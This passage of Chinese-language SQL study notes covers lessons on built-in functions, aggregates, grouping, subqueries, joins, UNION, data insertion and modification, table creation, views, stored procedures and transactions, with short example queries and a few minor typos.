<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">rtrim(列名)去除右边的空格</span><br><span class="line">ltrim(列名)去除左边的空格</span><br><span class="line"><span class="built_in">trim</span>(列名)去除两边的空格</span><br><span class="line"><span class="keyword">left</span>()返回字符串左边的字符</span><br><span class="line">length()返回字符串的长度</span><br><span class="line"><span class="built_in">lower</span>()将字符串转换为小写</span><br><span class="line"><span class="keyword">right</span>()返回字符串右边的字符</span><br><span class="line">substr或者<span class="built_in">substring</span>()提取字符串的组成部分</span><br><span class="line">soundex()返回字符串的soundex值</span><br></pre></td></tr></table></figure>

<p>其中，soundex是一个将任何文本串转换为描述其语音表示的字母数字模式的算法</p>
<h3 id="8-1-2日期和时间处理函数"><a href="#8-1-2日期和时间处理函数" class="headerlink" title="8.1.2日期和时间处理函数"></a>8.1.2日期和时间处理函数</h3><p>每种dbms都有自己的特殊形式的日期和时间。</p>
<p>例子：在sqlsever中检索2020年所有的订单，可如下进行：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> order_num</span><br><span class="line"><span class="keyword">from</span> Orders</span><br><span class="line"><span class="keyword">where</span> DATAPART(yy,order_date) <span class="operator">=</span> <span class="number">2020</span>;</span><br></pre></td></tr></table></figure>

<h3 id="8-1-3数值处理函数"><a href="#8-1-3数值处理函数" class="headerlink" title="8.1.3数值处理函数"></a>8.1.3数值处理函数</h3><p>这些函数，一般主要用于，代数，三角或集合运算，因此不想字符串和时间那样使用的平凡。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ABS</span>()返回一个数的绝对值</span><br><span class="line"><span class="built_in">COS</span>()返回一个角度的余弦</span><br><span class="line"><span class="built_in">EXP</span>()返回一个数的指数值</span><br><span class="line">PI()返回圆周率π的值</span><br><span class="line"><span class="built_in">SIN</span>()返回一个角度的正弦</span><br><span class="line"><span class="built_in">SQRT</span>()返回一个数的平方根</span><br><span class="line"><span class="built_in">TAN</span>()返回一个角度的正弦</span><br></pre></td></tr></table></figure>

<h1 id="第九课-汇总数据"><a href="#第九课-汇总数据" class="headerlink" title="第九课 汇总数据"></a>第九课 汇总数据</h1><h2 id="9-1聚集函数"><a href="#9-1聚集函数" class="headerlink" title="9.1聚集函数"></a>9.1聚集函数</h2><p>有时候需要汇总数据但是不用把他们实际检索出来、这种类型的检索例子有：</p>
<p>确定表中的行数</p>
<p>获得表中某些行的和</p>
<p>找出表列的最大值、最小值、平均值。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sql</span>聚集函数</span><br><span class="line"><span class="built_in">AVG</span>()返回某列的平均值</span><br><span class="line"><span class="built_in">COUNT</span>()返回某列的行数</span><br><span class="line"><span class="built_in">MAX</span>()返回某列的最大值</span><br><span class="line"><span class="built_in">MIN</span>()返回某列的最小值</span><br><span class="line"><span class="built_in">SUM</span>()返回某列值之和</span><br></pre></td></tr></table></figure>

<h3 id="9-1-1AVG-函数"><a href="#9-1-1AVG-函数" class="headerlink" title="9.1.1AVG()函数"></a>9.1.1AVG()函数</h3><p>可用来返回所有列的平均值，也可以用来返回特定列或行的平均值。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(id) <span class="keyword">from</span> <span class="keyword">member</span>;</span><br></pre></td></tr></table></figure>

<p>返回id的平均值。注意，avg()函数忽略列值为NULL的行。</p>
<h3 id="9-1-2COUNT-函数"><a href="#9-1-2COUNT-函数" class="headerlink" title="9.1.2COUNT()函数"></a>9.1.2COUNT()函数</h3><p>可利用count 确定表中行的数目或符合特定条件行的数目。</p>
<p>count()函数有两种使用方法</p>
<p>使用count(*)对表中行的数目进行计数，不管表列中包含的是空值还是非空值。</p>
<p>使用count(colums)对特定列中具有值的进行行计数，忽略null。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> num_cust <span class="keyword">from</span> <span class="keyword">member</span>;</span><br><span class="line">计算有多少行</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(cust_email) <span class="keyword">as</span> num_cust <span class="keyword">from</span> <span class="keyword">member</span>;</span><br><span class="line">计算有邮箱的用户有多少个</span><br></pre></td></tr></table></figure>

<h3 id="9-1-3max-函数"><a href="#9-1-3max-函数" class="headerlink" title="9.1.3max()函数"></a>9.1.3max()函数</h3><p>返回指定列中的最大值，要求指定列名。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(id) <span class="keyword">as</span> max_id <span class="keyword">from</span> <span class="keyword">member</span>;</span><br></pre></td></tr></table></figure>

<h3 id="9-1-4min-函数"><a href="#9-1-4min-函数" class="headerlink" title="9.1.4min()函数"></a>9.1.4min()函数</h3><p>返回指定列中的最小值，要求指定列名。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(id) <span class="keyword">as</span> min_id <span class="keyword">from</span> <span class="keyword">member</span>;</span><br></pre></td></tr></table></figure>

<h3 id="9-1-5sum-函数"><a href="#9-1-5sum-函数" class="headerlink" title="9.1.5sum()函数"></a>9.1.5sum()函数</h3><p>用返回指定列的和</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(id) <span class="keyword">as</span> sum_id <span class="keyword">from</span> <span class="keyword">member</span>;</span><br></pre></td></tr></table></figure>

<h2 id="9-2聚集不同值"><a href="#9-2聚集不同值" class="headerlink" title="9.2聚集不同值"></a>9.2聚集不同值</h2><p>以上五个聚集函数都可以如下使用：</p>
<p>对所有行执行计算，指定all参数或不指定参数（因为all是默认行为）。</p>
<p>只包含不同的值，指定distinct参数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(<span class="keyword">distinct</span> id) <span class="keyword">from</span> <span class="keyword">member</span>;</span><br></pre></td></tr></table></figure>

<h2 id="9-3组合聚集参数"><a href="#9-3组合聚集参数" class="headerlink" title="9.3组合聚集参数"></a>9.3组合聚集参数</h2><p>实际上，selct语句可以根据需要包含多个聚集函数。中间用逗号隔开</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(<span class="keyword">distinct</span> id),<span class="built_in">min</span>(id) <span class="keyword">from</span> <span class="keyword">member</span>;</span><br></pre></td></tr></table></figure>

<h1 id="10-分组数据"><a href="#10-分组数据" class="headerlink" title="10.分组数据"></a>10.分组数据</h1><h2 id="10-1数据分组"><a href="#10-1数据分组" class="headerlink" title="10.1数据分组"></a>10.1数据分组</h2><p>使用分组可以将数据分为多个逻辑组，对每个组进行聚集计算。</p>
<h2 id="10-2创建分组"><a href="#10-2创建分组" class="headerlink" title="10.2创建分组"></a>10.2创建分组</h2><p>分组是使用SELECT语句的GROUP BY子句建立的。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> sum <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">group</span> <span class="keyword">by</span> username;</span><br></pre></td></tr></table></figure>

<p>由于使用了group by语句，count函数会对每一个组进行计算。这个语句的意思就是，检索每一个用户有多少条数据。</p>
<p>注意，group by子句必须出现在where子句之后，order by 子句之前。</p>
<h2 id="10-3过滤分组"><a href="#10-3过滤分组" class="headerlink" title="10.3过滤分组"></a>10.3过滤分组</h2><p>虽然where可以进行数据的过滤，但是因为where过滤指定的是行而不是分组，实际上，where子句并没有分组的概念。</p>
<p>这时候我们可以用having子句来代替，他们的差距就是where过滤行，having过滤分组。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> sum <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">group</span> <span class="keyword">by</span> username <span class="keyword">having</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="operator">&gt;=</span><span class="number">2</span>;</span><br><span class="line">这个语句的意思就是，检索有两行以上上数据的用户名字。</span><br></pre></td></tr></table></figure>

<p>注意：having要放在group by后面。</p>
<h2 id="10-4select子句顺序"><a href="#10-4select子句顺序" class="headerlink" title="10.4select子句顺序"></a>10.4select子句顺序</h2><p>下面回顾一下select语句中子句的顺序。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line"><span class="keyword">HAVING</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br></pre></td></tr></table></figure>

<h1 id="第十一课-使用子查询"><a href="#第十一课-使用子查询" class="headerlink" title="第十一课 使用子查询"></a>第十一课 使用子查询</h1><h2 id="11-1子查询"><a href="#11-1子查询" class="headerlink" title="11.1子查询"></a>11.1子查询</h2><p>sql支持创建子查询，即创建在其他查询中的查询。</p>
<p>下面举几个例子</p>
<h2 id="11-2利用子查询进行过滤"><a href="#11-2利用子查询进行过滤" class="headerlink" title="11.2利用子查询进行过滤"></a>11.2利用子查询进行过滤</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> cust_id</span><br><span class="line"><span class="keyword">from</span> Orders</span><br><span class="line"><span class="keyword">where</span> order_num <span class="keyword">IN</span> (<span class="keyword">select</span> order_num</span><br><span class="line">                   <span class="keyword">from</span> OrderItems</span><br><span class="line">                   <span class="keyword">where</span> prod<span class="operator">-</span>id <span class="operator">=</span> <span class="string">&#x27;RGAN01&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这里就限制了order_num的范围，在select语句中，子查询总是从内向外处理。而且对于子查询的嵌套没有限制。</p>
<h1 id="第十二课-联结表"><a href="#第十二课-联结表" class="headerlink" title="第十二课 联结表"></a>第十二课 联结表</h1><h2 id="12-1联结"><a href="#12-1联结" class="headerlink" title="12.1联结"></a>12.1联结</h2><p>sql最强大的功能就是在数据查询的执行中联结(join)表。联结是利用sql的select能执行的最重要的操作。</p>
<h3 id="12-1-1创建联结"><a href="#12-1-1创建联结" class="headerlink" title="12.1.1创建联结"></a>12.1.1创建联结</h3><p>创建联结非常简单，指定要连接的所有表以及关联他们的方式即可。</p>
<p>下面看一个例子</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> vend_name,prod_name,prod_price</span><br><span class="line"><span class="keyword">from</span> Vendors,Products</span><br><span class="line"><span class="keyword">WHERE</span> Vendors.vend_id <span class="operator">=</span> Products.ven_id;</span><br><span class="line">#<span class="keyword">where</span>子句指示dbms将Vendors表中的vend_id与Products表中的vend_id匹配起来。</span><br></pre></td></tr></table></figure>

<h3 id="12-1-2内连接"><a href="#12-1-2内连接" class="headerlink" title="12.1.2内连接"></a>12.1.2内连接</h3><p>目前为止使用的联结称为等值联结，他基于两个表之间的相等测试，这种联结也称为内连接。</p>
<h1 id="第十三课-创建高级联结（未完）"><a href="#第十三课-创建高级联结（未完）" class="headerlink" title="第十三课 创建高级联结（未完）"></a>第十三课 创建高级联结（未完）</h1><h2 id="13-1使用表别名"><a href="#13-1使用表别名" class="headerlink" title="13.1使用表别名"></a>13.1使用表别名</h2><p>同样是在表的后面使用as关键字即可，</p>
<h1 id="第十四课-组合查询"><a href="#第十四课-组合查询" class="headerlink" title="第十四课 组合查询"></a>第十四课 组合查询</h1><h2 id="14-1组合查询"><a href="#14-1组合查询" class="headerlink" title="14.1组合查询"></a>14.1组合查询</h2><p>sql也允许执行多个查询，(多条sql语句)，并将结果作为一个查询结果集返回，这些组合查询通常称为并(union)或复合查询(xompound query)</p>
<h2 id="14-2创建组合查询"><a href="#14-2创建组合查询" class="headerlink" title="14.2创建组合查询"></a>14.2创建组合查询</h2><h3 id="14-2-1使用UNION"><a href="#14-2-1使用UNION" class="headerlink" title="14.2.1使用UNION"></a>14.2.1使用UNION</h3><p>给出每条SELECT语句，在每条语句之间放上关键字union。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>虽然sql没有对union数量进行限制，但是最好参考一下dbms的文档。</p>
<h3 id="14-2-2union规则"><a href="#14-2-2union规则" class="headerlink" title="14.2.2union规则"></a>14.2.2union规则</h3><p>1.union必须有两条或两条以上的select语句组成，语句中间用union分隔。</p>
<p>2.union中的每个查询必须包含相同的列、表达式或聚集函数。</p>
<p>3.列数据类型必须兼容，类型不必完全相同，但是必须是dbms可以隐含转换的类型。</p>
<h3 id="14-2-3包含或取消重复的行"><a href="#14-2-3包含或取消重复的行" class="headerlink" title="14.2.3包含或取消重复的行"></a>14.2.3包含或取消重复的行</h3><p>union会自动将重复的行删除，如果想要返回重复的行，使用union all即可</p>
<h3 id="14-2-4对组合查询结果排序"><a href="#14-2-4对组合查询结果排序" class="headerlink" title="14.2.4对组合查询结果排序"></a>14.2.4对组合查询结果排序</h3><p>在使用union时，只能使用一条ORDER BY语句，必须位于最后一条select语句的后面，不存在用一种方式排列一部分。</p>
<h1 id="第十五课-插入数据"><a href="#第十五课-插入数据" class="headerlink" title="第十五课 插入数据"></a>第十五课 插入数据</h1><h2 id="15-1数据插入"><a href="#15-1数据插入" class="headerlink" title="15.1数据插入"></a>15.1数据插入</h2><p>除了select语句，sql同样还有其他三个常用的语句。数据插入就是INSERT</p>
<p>顾名思义，insert用来将行插入到数据库中，插入有几种方式；</p>
<p>插入完整的行；</p>
<p>插入行的一部分；</p>
<p>插入写查询的结果；</p>
<h3 id="15-1-1插入完整的行"><a href="#15-1-1插入完整的行" class="headerlink" title="15.1.1插入完整的行"></a>15.1.1插入完整的行</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">member</span></span><br><span class="line"><span class="keyword">VALUES</span>(<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;asdasdasd&#x27;</span>,<span class="string">&#x27;boy&#x27;</span>,<span class="string">&#x27;1111111111&#x27;</span>,<span class="string">&#x27;chain&#x27;</span>,<span class="string">&#x27;aaa@pikachu.com&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>注意：必须给每一列都提供一个值，如果没有值，那也必须输入null。</p>
<p>虽然上述方法比较简单，但是并不安全，因为他依赖于列的顺序，很有可能就会打乱我们的数据库，下面介绍一种更加安全的方法。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">member</span>(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;pw&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;phonenum&#x27;</span>,<span class="string">&#x27;address&#x27;</span>,<span class="string">&#x27;email&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;asdasdasd&#x27;</span>,<span class="string">&#x27;boy&#x27;</span>,<span class="string">&#x27;1111111111&#x27;</span>,<span class="string">&#x27;chain&#x27;</span>,<span class="string">&#x27;aaa@pikachu.com&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>虽然这种方法与上面功能一样而且更加繁琐但是不会打乱我们的数据库，因为明确给出了每一列的列名，就像python中的基于索引和基于名字的参数。</p>
<h3 id="15-1-2插入部分行"><a href="#15-1-2插入部分行" class="headerlink" title="15.1.2插入部分行"></a>15.1.2插入部分行</h3><p>正如所述，使用INSERT的推荐方法是明确给出表的列名。用这种语法还可以省略列，这表示可以只给某些列提供值，给其他列不提供值。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">member</span>(<span class="string">&#x27;pw&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;phonenum&#x27;</span>,<span class="string">&#x27;address&#x27;</span>,<span class="string">&#x27;email&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="string">&#x27;asdasdasd&#x27;</span>,<span class="string">&#x27;boy&#x27;</span>,<span class="string">&#x27;1111111111&#x27;</span>,<span class="string">&#x27;chain&#x27;</span>,<span class="string">&#x27;aaa@pikachu.com&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>这里就没有输入id 和username这两行，这表示insert语句省略了这两列，如果省略了，有默认值就是默认值没有就是null。</p>
<h3 id="15-1-3插入检索出的数据"><a href="#15-1-3插入检索出的数据" class="headerlink" title="15.1.3插入检索出的数据"></a>15.1.3插入检索出的数据</h3><p>可以使用INSERT SELECT来实现插入检索出的数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">member</span>(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;pw&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;phonenum&#x27;</span>,<span class="string">&#x27;address&#x27;</span>,<span class="string">&#x27;email&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">SELECT</span> id,username,pw,sex,phonenum,address,xxx</span><br><span class="line"><span class="keyword">FROM</span> xxx;</span><br></pre></td></tr></table></figure>

<h2 id="15-2从一个表复制到另一个表"><a href="#15-2从一个表复制到另一个表" class="headerlink" title="15.2从一个表复制到另一个表"></a>15.2从一个表复制到另一个表</h2><p>有一种数据插入不使用insert语句，要将一个表的内容复制到一个全新表(运行中创建的表)。</p>
<p>使用CREATE SELECT</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> custcopy <span class="keyword">AS</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> customers;</span><br></pre></td></tr></table></figure>



<h1 id="第十六课-更新和删除数据"><a href="#第十六课-更新和删除数据" class="headerlink" title="第十六课 更新和删除数据"></a>第十六课 更新和删除数据</h1><p>这一课介绍如何利用UPDATE 和 DELETE语句进一步操作表数据。</p>
<h2 id="16-1更新数据"><a href="#16-1更新数据" class="headerlink" title="16.1更新数据"></a>16.1更新数据</h2><p>更新(修改)数据，可以使用UPDATE语句，有两种使用的方法：</p>
<p>更新中的特定行</p>
<p>更新表中所有行</p>
<p>基本的UPDATE语句由三部分组成，分别是：要更新的表，列名和他们的新值，确定要更新哪些行的过滤条件。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE copytable </span><br><span class="line"><span class="keyword">SET</span> username <span class="operator">=</span> <span class="string">&#x27;xiugai&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>上面语句就是修改id为1的用户的名字。</p>
<p>在更新多个列时，只需要使用一条set命令，每个“列=值”对之间用逗号分隔。</p>
<h2 id="16-2删除数据"><a href="#16-2删除数据" class="headerlink" title="16.2删除数据"></a>16.2删除数据</h2><p>从个表中删除数据，使用DELETE语句，有两种使用方式：</p>
<p>从表中删除特定的行</p>
<p>从表中删除所有行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> copytable</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>删除了表copytable中id为1的用户。如果省略WHERE语句，他就会删除整个表。update也一样。</p>
<h1 id="第十七课-创建和操纵表"><a href="#第十七课-创建和操纵表" class="headerlink" title="第十七课 创建和操纵表"></a>第十七课 创建和操纵表</h1><h2 id="17-1创建表"><a href="#17-1创建表" class="headerlink" title="17.1创建表"></a>17.1创建表</h2><p>一般有两种创建表的方法：</p>
<p>多数dbms都具有交互式创建和管理数据库表的工具</p>
<p>表可以直接用sql语句操纵</p>
<h3 id="17-1-1表创建基础"><a href="#17-1-1表创建基础" class="headerlink" title="17.1.1表创建基础"></a>17.1.1表创建基础</h3><p>利用CREATE TABLE创建表，必须给出下列信息：</p>
<p>新表的名字，在create table关键字之后给出</p>
<p>列表的名字和定义，用逗号分隔</p>
<p>有的dbms还要求指定表的位置</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> new_table</span><br><span class="line">(id <span class="type">CHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line"> passwd <span class="type">CHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>这里创建了一个名叫new_table 的表，表中有两列，一列是id 一列是passwd，后面跟了数据类型。</p>
<h3 id="17-1-2使用null值"><a href="#17-1-2使用null值" class="headerlink" title="17.1.2使用null值"></a>17.1.2使用null值</h3><p>每个表列要么是NULL列，要么是NOT NULL列，有null的时候那个列的默认值就是null。</p>
<h3 id="17-1-3指定默认列"><a href="#17-1-3指定默认列" class="headerlink" title="17.1.3指定默认列"></a>17.1.3指定默认列</h3><p>默认值在CREATE TABLE语句的列定义中用关键字DEFAULT指定</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> new_table</span><br><span class="line">(id <span class="type">CHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line"> passwd <span class="type">CHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">1</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="17-2更新表"><a href="#17-2更新表" class="headerlink" title="17.2更新表"></a>17.2更新表</h2><p>更新表定义，可以使用ALTER TABLE语句，虽然所有的dbms都支持这个语句，但是他们的允许更新的内容差别很大。</p>
<p>所以在这里给出都支持的操作。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> new_table</span><br><span class="line"><span class="keyword">ADD</span> name <span class="type">CHAR</span>(<span class="number">20</span>)</span><br></pre></td></tr></table></figure>

<p>在new_table 表中创建了添加了一个新的列，名为name。</p>
<h2 id="17-3删除表"><a href="#17-3删除表" class="headerlink" title="17.3删除表"></a>17.3删除表</h2><p>使用DROP TABLE语句即可</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> new_table;</span><br></pre></td></tr></table></figure>

<h2 id="17-4重命名表"><a href="#17-4重命名表" class="headerlink" title="17.4重命名表"></a>17.4重命名表</h2><p>每个dbms对表重命名的支持有所不同，对于这个操作，不存在严格的标准。</p>
<p>mysql用户使用rename语句，其他的大伙自行查阅即可。</p>
<h1 id="第十八课-使用视图"><a href="#第十八课-使用视图" class="headerlink" title="第十八课 使用视图"></a>第十八课 使用视图</h1><h2 id="18-1视图"><a href="#18-1视图" class="headerlink" title="18.1视图"></a>18.1视图</h2><p>视图是虚拟的表，与包含数据的表不一样，视图只包含使用时动态检索数据的查询。</p>
<p>当我们需要查询多个表的数据时，可能会运用表的联结，但是如果把多个表包装成名为xxx的虚拟表，则可以让我们的检索代码更加简洁。</p>
<h3 id="18-1-1视图的一些规则和限制"><a href="#18-1-1视图的一些规则和限制" class="headerlink" title="18.1.1视图的一些规则和限制"></a>18.1.1视图的一些规则和限制</h3><p>与表一样，视图必须唯一命名。</p>
<p>对于可以创建的视图数目没有限制。</p>
<p>视图可以嵌套，即可以利用从其他视图中检索数据的查询来构造视图。</p>
<p>许多dbms禁止在视图中使用order by</p>
<h2 id="18-2创建视图"><a href="#18-2创建视图" class="headerlink" title="18.2创建视图"></a>18.2创建视图</h2><p>用CREATE VIEW 语句来创建，并且只能用于创建不存在的视图。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> xxx <span class="keyword">as</span></span><br><span class="line"><span class="keyword">select</span> xxx,xxx</span><br><span class="line"><span class="keyword">from</span> xxx,xx</span><br><span class="line"><span class="keyword">where</span> xxx</span><br></pre></td></tr></table></figure>

<h1 id="第十九课-使用存储过程"><a href="#第十九课-使用存储过程" class="headerlink" title="第十九课 使用存储过程"></a>第十九课 使用存储过程</h1><h2 id="19-1存储过程"><a href="#19-1存储过程" class="headerlink" title="19.1存储过程"></a>19.1存储过程</h2><p>简单的说，存储过程就是为以后使用而保存的一条或多条sql语句，可将其视为批文件，虽然他们的作用不仅限于批处理。#可以理解为python中创建一个函数</p>
<h2 id="19-2执行储存过程"><a href="#19-2执行储存过程" class="headerlink" title="19.2执行储存过程"></a>19.2执行储存过程</h2><p>存储过程的的执行远比编写繁琐得多，所以我们先介绍存储过程的执行，</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> AddNewProduct(<span class="string">&#x27;JTSO1&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;Stuffed Eiffel Tower&#x27;</span>,</span><br><span class="line">                      <span class="number">6</span>,<span class="number">49</span>,</span><br><span class="line">                      <span class="string">&#x27;Plush stuffed toy withxxxx&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>这里执行了一个名为AddNewProduct的存储过程，佳宁一个新产品添加到Product表中，里面有四个参数，供应商，产品名，价格和描述，</p>
<h2 id="19-3创建存储过程"><a href="#19-3创建存储过程" class="headerlink" title="19.3创建存储过程"></a>19.3创建存储过程</h2><p>下面的例子是SqlServer版本?为什么作者说执行的过程比创建的过程更加繁琐？？？？</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> Malilinglistcount </span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@cnt</span> <span class="type">INTEGER</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@cnt</span> <span class="operator">=</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">FROM</span> Customers</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> cust_email <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">RETURN</span> <span class="variable">@cnt</span>;</span><br></pre></td></tr></table></figure>

<p>分析：申明了一个局部变量@cnt，然后在select语句中使用这个变量 让他包含count()函数返回的的值，最后用return输出。</p>
<h1 id="第二十课管理事务处理"><a href="#第二十课管理事务处理" class="headerlink" title="第二十课管理事务处理"></a>第二十课管理事务处理</h1><h2 id="20-1事务处理"><a href="#20-1事务处理" class="headerlink" title="20.1事务处理"></a>20.1事务处理</h2><p>使用事务处理，通过确保成批的sql操作要么完全知晓，要么不完全执行，来维护数据库的完整性。</p>
<p>下面是事务处理的几个关键词</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">事物 transaction 指一组<span class="keyword">sql</span>语句</span><br><span class="line">回退 <span class="keyword">rollback</span> 指撤销指定<span class="keyword">sql</span>的过程</span><br><span class="line">提交 <span class="keyword">commit</span> 指将为存储的<span class="keyword">sql</span>语句结果写入数据库表</span><br><span class="line">保留点 saepoint 值事务处理中设置的临时占位符，可以对他发布退回</span><br></pre></td></tr></table></figure>

<h2 id="20-2控制事务处理"><a href="#20-2控制事务处理" class="headerlink" title="20.2控制事务处理"></a>20.2控制事务处理</h2><p>不同的dbms有不同的语法。</p>
<p>下面举sql server</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span> TRANSACTION</span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span> TRANSACTION</span><br></pre></td></tr></table></figure>

<h3 id="20-2-1使用ROLLBACK"><a href="#20-2-1使用ROLLBACK" class="headerlink" title="20.2.1使用ROLLBACK"></a>20.2.1使用ROLLBACK</h3><p>sqk的rollback用来回撤sql语句，</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> Orders</span><br><span class="line"><span class="keyword">ROLLBACK</span></span><br></pre></td></tr></table></figure>

<h3 id="20-2-2使用commit"><a href="#20-2-2使用commit" class="headerlink" title="20.2.2使用commit"></a>20.2.2使用commit</h3><p>一般的sql语句都是针对数据库表直接执行和编写的。这就是所谓的隐式提交(implicit commit)，即提交操作是自动进行的。</p>
<p>在事物处理块中，他并不会隐式提交，有的dbms又是。</p>
<p>下面是sql server 的例子</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span> TRANSACTION</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">Order</span></span><br><span class="line"><span class="keyword">COMMIT</span> TRANSACTION</span><br></pre></td></tr></table></figure>

